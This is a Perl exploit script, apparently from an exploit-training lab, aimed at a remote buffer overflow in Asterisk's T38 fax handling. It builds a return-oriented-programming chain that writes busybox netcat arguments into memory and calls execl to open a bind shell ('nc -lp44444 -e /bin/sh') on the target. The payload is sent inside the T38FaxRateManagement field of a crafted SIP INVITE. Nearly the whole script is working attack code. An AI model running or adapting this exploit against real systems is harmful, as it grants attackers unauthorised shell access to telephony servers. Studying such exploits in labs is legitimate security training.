#!/usr/bin/perl
# Remote Buffer Overflow in Asterisk T38 fax
# The Exploit Laboratory - TINYSPLOIT2
#
# Usage: 
# perl sip-exploit.pl <ip>
#
# It will create a netcat listener on port 44444.
#
# by Dobin Rutishauser

use IO::Socket;


$pop_eax = 0x08060f10; # 0x08060f10: pop eax; pop ebx; pop ebp; ret;
$pop_ebx = 0x0813c85c; # 0x0813c85c: pop ebx; ret;
$pop_edx = 0x0808db7e; # 0x0808db7e: pop edx; ret;

$mov_dedx_eax = 0x08112483; # 0x08112483: mov dword ptr [edx], eax; pop ebx; pop ebp; ret;
$ret = 0x08048af0;

$malloc_addr = 0x0815324c;
$malloc_to_system_offset = 0x39fc0;

$writeable_addr = 0x815e324;
$writeable_addr2 = 0x815e324-8;


# load immediate eax with value
sub load_eax {
	my ($eax) = @_;
	my $gadget = "";

	$gadget .= pack("V", $pop_eax);   # pop eax; ret
	$gadget .= pack("V", $eax);       # --> EAX
	$gadget .= pack("V", 0x44444444); # fake EBX
	$gadget .= pack("V", 0x44444444); # fake EBP
	return($gadget);
}


# writes value of eax to a specific memory address
sub write_mem_eax {
	my ($addr) = @_;
	my $gadget .= "";

	$gadget .= pack("V", $pop_edx);      # pop R1; ret
	$gadget .= pack("V", $addr);         # R1 = address
	$gadget .= pack("V", $mov_dedx_eax); # mov dword ptr [R1], eax; ret
	$gadget .= pack("V", 0x45454545);
	$gadget .= pack("V", 0x45454545);
	return($gadget);
}


# write4 - write any 4-byte value to any memory address
sub write4 {
	my ($addr, $data) = @_;
	my $gadget .= ""; 

	$gadget .= load_eax($data);
	$gadget .= write_mem_eax($addr);

	return($gadget);
}

sub DumpString {
my $s = shift || "";
my @a = unpack('C*',$s);
my $o = 0;
my $i = 0;
print "\tb0 b1 b2 b3 b4 b5 b6 b7\n";
print "\t-- -- -- -- -- -- -- --\n";
while (@a) {
my @b = splice @a,0,8;
my @x = map sprintf("%02x",$_), @b;
my $c = substr($s,$o,8);
$c =~ s/[[:^print:]]/ /g;
printf "w%02d",$i;
print " "x5,join(' ',@x),"\n";
$o += 8;
$i++;
}
}

sub create_payload {
	$ropchain = "";

	# just do a ret
	$ropchain .= pack("V", $ret);

	$exec_path_addr = 0x815e354;
	$exec_arg1_addr = 0x815e364;
	$exec_arg2_addr = 0x815e374;
	$exec_arg3_addr = 0x815e384;


	# 12: "/bin/busybox
	# 2f 62 69 6e 2f 62 75 73  79 62 6f 78 0a           |/bin/busybox.|
	$ropchain .= write4($exec_path_addr+0, 0x6e69622f); # 2f 62 69 6e
	$ropchain .= write4($exec_path_addr+4, 0x7375622f); # 2f 62 75 73
	$ropchain .= write4($exec_path_addr+8, 0x786f6279); # 79 62 6f 78

	# 12: "//usr/bin/nc"
	# 2f 2f 75 73 | 72 2f 62 69 | 6e 2f 6e 63              |//usr/bin/nc|
	$ropchain .= write4($exec_arg1_addr+0, 0x73752f2f); # 2f 2f 75 73
	$ropchain .= write4($exec_arg1_addr+4, 0x69622f72); # 72 2f 62 69
	$ropchain .= write4($exec_arg1_addr+8, 0x636e2f6e); # 6e 2f 6e 63

	#  8: "-lp44444"
	# 2d 6c 70 34 34 34 34 34                           |-lp44444|
	$ropchain .= write4($exec_arg2_addr+0, 0x34706c2d); # 2d 6c 70 34
	$ropchain .= write4($exec_arg2_addr+4, 0x34343434); # 34 34 34 34

	# 12: "-e////bin/sh"
	# 2d 65 2f 2f 2f 2f 62 69  6e 2f 73 68              |-e////bin/sh|
	$ropchain .= write4($exec_arg3_addr+0, 0x2f2f652d); # 2d 65 2f 2f
	$ropchain .= write4($exec_arg3_addr+4, 0x69622f2f); # 2f 2f 62 69
	$ropchain .= write4($exec_arg3_addr+8, 0x68732f6e); # 6e 2f 73 68


		# get addr of execl from PLT
	# we use this add gadget (which we need to work around):
	# 0x081187df: add eax, dword ptr [ebx + 0x5e5b5cc4]; pop edi; pop ebp; ret;

	## get offset into eax
	# offset to eax. The offset is not the original 0x3ff30,
	# but xor'ed with 0x2f131326, therefore 0x2f10ec16
	$ropchain .= pack("V", $pop_eax);    # 0x08060f10: pop eax; pop ebx; pop ebp; ret;
	$ropchain .= pack("V", 0x2f10ec16);  # EAX
	$ropchain .= pack("V", 0x44444444);  # fake EBX
	$ropchain .= pack("V", 0x44444444);  # fake EBP

	# fix eax by xoring it:
	$ropchain .= pack("V", 0x0811ef88);  # 0x0811ef88: xor eax, 0x2f131326; ret;

	## get addr of malloc into ebx
	# addr of malloc into ebx. Adjust for offset contained in add gadget.
	$ropchain .= pack("V", $pop_ebx);    # 0x0813c85c: pop ebx; ret;
	$ropchain .= pack("V", $malloc_addr-0x5e5b5cc4);

	# add eax with [ebx], write result into eax
	# 0x081187df: add eax, dword ptr [ebx + 0x5e5b5cc4]; pop edi; pop ebp; ret;
	# note: we dereference ebx. Therefore its like: eax = eax + *ebx
	#       the dereference will access the address of system, from plt
	$ropchain .= pack("V", 0x081187df);  # add
	$ropchain .= pack("V", 0x44444444);  # fake edi
	$ropchain .= pack("V", 0x44444444);  # fake ebp

	# jmp to addr in eax
	# 0x080577cf: call eax; pop eax; pop ebx; leave; ret;
	# the commands after call (pop eax etc.) will never be executed,
	# as we execl()
	$ropchain .= pack("V", 0x080577cf);  # call eax

	# args for execl
	$ropchain .= pack("V", $exec_path_addr);   # path
	$ropchain .= pack("V", $exec_arg1_addr);   # arg1
	$ropchain .= pack("V", $exec_arg2_addr);   # arg2
	$ropchain .= pack("V", $exec_arg3_addr);   # arg3
	                                           # null implicit
	return ($ropchain);
}



if(not $ARGV[0]) {
   print "Usage: sipcrash.pl <host>\n";
   exit;
}

my $target=$ARGV[0];
my $target_port = 5060;

my $eip = 0x42424242;
my $padding = "A" x 556;

$payload = create_payload();



my $buf = $padding . $payload;

my $sip_packet = "v=0\n";
$sip_packet .= "o=rtp 1160124458839569000 160124458839569000 IN IP4 127.0.0.1\n";
$sip_packet .= "s=-\n";
$sip_packet .= "c=IN IP4 127.0.0.1\n";
$sip_packet .= "t=0 0\n";
$sip_packet .= "m=image 5004 UDPTL t38\n";
$sip_packet .= "a=T38FaxVersion:0\n";
$sip_packet .= "a=T38MaxBitRate:14400\n";
$sip_packet .= "a=T38FaxMaxBuffer:1024\n";
$sip_packet .= "a=T38FaxMaxDatagram:238\n";
$sip_packet .= "a=T38FaxRateManagement:$buf\n";
$sip_packet .= "a=T38FaxUdpEC:t38UDPRedundancy\n";

$sip_length = length($sip_packet);

my $packet =<<END;
INVITE sip:200\@127.0.0.1 SIP/2.0
CSeq: 1 INVITE
Via: SIP/2.0/UDP 127.0.0.1:1024
From: "Prank Caller" <sip:prank\@127.0.0.1:1024>
Call-ID: aaaaaaaa-aaaa-aaaaaaa-aaaa-aaaaaaaaaaaa\@localhost
To: <sip:200@localhost>
Allow: INVITE,ACK,OPTIONS,BYE,CANCEL,NOTIFY,REFER,MESSAGE
Content-Type: application/sdp
Content-Length: $sip_length
Max-Forwards: 70

$sip_packet
END

print "Packet\n$packet\n";

print "Sending Packet to: " . $target . "\n\n";
socket(SOCK, PF_INET, SOCK_DGRAM, getprotobyname("udp"));
my $ipaddr = inet_aton($target);
my $sendto = sockaddr_in($target_port, $ipaddr);
send(SOCK, $packet, 0, $sendto) == length($packet) or die "cannot send to $target : $target_port : $!\n";
print "Sent.\n";

DumpString($payload);

